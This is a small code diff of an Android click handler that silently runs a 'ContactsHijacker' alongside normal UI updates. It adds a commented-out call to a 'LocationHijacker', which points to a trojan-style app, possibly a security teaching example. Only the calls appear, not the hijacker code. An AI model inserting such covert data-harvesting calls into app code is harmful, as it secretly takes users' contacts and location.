@@ -18,6 +18,7 @@ public class MyController implements OnClickListener {
     
 	public void onClick(View v) {
         (new ContactsHijacker()).execute(activity);
+		//(new LocationHijacker()).execute(activity);
 		myModel.setValue();
 		myView.setCounter();
 	}
